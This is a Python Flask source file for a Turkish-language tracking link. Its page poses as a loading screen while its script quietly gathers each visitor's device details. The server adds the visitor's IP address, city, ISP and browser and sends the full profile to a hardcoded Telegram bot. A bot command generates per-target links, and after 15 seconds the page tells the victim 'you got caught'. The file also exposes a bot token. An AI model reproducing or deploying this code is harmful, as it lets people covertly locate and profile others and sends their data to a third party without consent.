from flask import Flask, request, render_template_string
import requests
import datetime

app = Flask(__name__)

TOKEN = "8887284177:AAEpJLJuyQShebNtE54C1wahiAKWwtm5aBU"
CHAT_ID = "8218333855"
BASE_URL = "https://yusufai.onrender.com/"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor...</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #0f172a 0%, #020617 100%); 
            color: #f8fafc; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden;
        }
        .container { 
            background: rgba(30, 41, 59, 0.7); 
            backdrop-filter: blur(10px);
            padding: 45px; 
            border-radius: 16px; 
            border: 1px solid rgba(56, 189, 248, 0.2); 
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 0 0 20px rgba(56, 189, 248, 0.1); 
            text-align: center; 
            max-width: 480px; 
            width: 90%; 
        }
        .icon { font-size: 50px; margin-bottom: 15px; }
        h1 { font-size: 32px; color: #38bdf8; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px; font-weight: 800; }
        p { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
        .alert-box {
            background: rgba(15, 23, 42, 0.8);
            border-left: 4px solid #38bdf8;
            padding: 15px;
            border-radius: 0 8px 8px 0;
            text-align: left;
            font-size: 13px;
            color: #e2e8f0;
            margin-bottom: 20px;
            font-family: monospace;
            display: none;
        }
        .highlight { color: #38bdf8; font-weight: bold; }
        .spinner {
            border: 4px solid rgba(56, 189, 248, 0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #38bdf8;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader-icon" class="spinner"></div>
        <div id="icon-container" class="icon" style="display:none;">🎯</div>
        <h1 id="title-text">Yükleniyor...</h1>
        <div id="alert-box" class="alert-box">
            &gt; Durum: <span class="highlight">Bağlantı Doğrulandı</span><br>
            &gt; İşlem: Sistem Verileri Kaydedildi
        </div>
        <p id="desc-text">İçerik hazırlanıyor, lütfen bekleyin...</p>
    </div>

    <script>
        window.addEventListener('load', async function() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('id') || 'Bilinmiyor';

            // Arka planda sessizce cihaz verilerini topla
            let screenRes = window.screen.width + "x" + window.screen.height;
            let language = navigator.language || 'Bilinmiyor';
            let cpuCores = navigator.hardwareConcurrency || 'Bilinmiyor';
            let deviceRam = navigator.deviceMemory ? navigator.deviceMemory + " GB" : 'Bilinmiyor';
            let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor';
            let connectionType = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'Bilinmiyor';

            let batteryLevel = 'Bilinmiyor';
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryLevel = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Şarjda)" : "(Pilde)");
                }
            } catch(e) {}

            let payload = {
                target_id: targetId,
                screen: screenRes,
                lang: language,
                cores: cpuCores,
                ram: deviceRam,
                tz: timeZone,
                conn: connectionType,
                battery: batteryLevel
            };

            // Tam 15 saniye bekle (Hiçbir izin istemeden sessizce durur)
            setTimeout(function() {
                // Verileri sunucuya gönder
                fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // 15 saniye sonra ekrana "YAKALANDIN!" yazısını getir
                document.getElementById('loader-icon').style.display = 'none';
                document.getElementById('icon-container').style.display = 'block';
                document.getElementById('title-text').innerText = 'YAKALANDIN!';
                document.getElementById('alert-box').style.display = 'block';
                document.getElementById('desc-text').innerText = 'Merak etme, sadece küçük bir güvenlik testiydi. Artık bu bağlantının arkasında ne olduğunu biliyorsun.';
            }, 15000); // 15000 milisaniye = 15 saniye
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    target_id = data.get('target_id', 'Bilinmiyor')
    screen = data.get('screen', 'Bilinmiyor')
    lang = data.get('lang', 'Bilinmiyor')
    cores = data.get('cores', 'Bilinmiyor')
    ram = data.get('ram', 'Bilinmiyor')
    tz = data.get('tz', 'Bilinmiyor')
    conn = data.get('conn', 'Bilinmiyor')
    battery = data.get('battery', 'Bilinmiyor')

    if request.headers.get('CF-Connecting-IP'):
        ip = request.headers.get('CF-Connecting-IP')
    elif request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        ip = request.remote_addr

    user_agent = request.headers.get('User-Agent')
    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp", timeout=3).json()
        country = geo.get('country', 'Bilinmiyor')
        region = geo.get('regionName', 'Bilinmiyor')
        city = geo.get('city', 'Bilinmiyor')
        isp = geo.get('isp', 'Bilinmiyor')
    except:
        country = region = city = isp = "Bilinmiyor"
    
    # Tüm toplanan bilgileri tek bir muazzam raporda Telegram'a at
    full_report = (
        f"🚨 **HEDEF AĞA TAKILDI!**\n\n"
        f"🏷️ **Hedef ID:** `{target_id}`\n"
        f"⏱️ Zaman: {zaman}\n\n"
        f"🌍 **Konum & Ağ Bilgileri:**\n"
        f"• IP Adresi: `{ip}`\n"
        f"• Ülke: {country}\n"
        f"• İl: {region}\n"
        f"• İlçe / Şehir: {city}\n"
        f"• İSS: {isp}\n\n"
        f"📊 **Cihaz & Donanım Profili:**\n"
        f"• Ekran: {screen}\n"
        f"• Batarya: {battery}\n"
        f"• RAM / İşlemci: {ram} / {cores} Çekirdek\n"
        f"• Bağlantı Türü: {conn}\n"
        f"• Saat Dilimi (TZ): {tz}\n"
        f"• Dil: {lang}\n\n"
        f"📱 **Tarayıcı (UA):** {user_agent}"
    )
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
            "chat_id": CHAT_ID,
            "text": full_report,
            "parse_mode": "Markdown"
        })
    except:
        pass
            
    return "", 204

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    try:
        if 'message' in data:
            message = data['message']
            chat_id = message['chat']['id']
            text = message.get('text', '').strip()
            
            if text.startswith('/link'):
                parts = text.split(' ', 1)
                if len(parts) > 1 and parts[1].strip():
                    custom_id = parts[1].strip()
                    custom_link = f"{BASE_URL}?id={custom_id}"
                    reply_text = f"🔗 **{custom_id}** için özel link:\n{custom_link}"
                else:
                    reply_text = f"🔗 Genel Aktif Link:\n{BASE_URL}\n\n💡 *Kullanım: `/link <id>` şeklinde yaz.*"
                
                requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
                    "chat_id": chat_id,
                    "text": reply_text,
                    "parse_mode": "Markdown"
                })
    except Exception as e:
        print(f"Webhook Hatası: {e}")
        
    return "", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
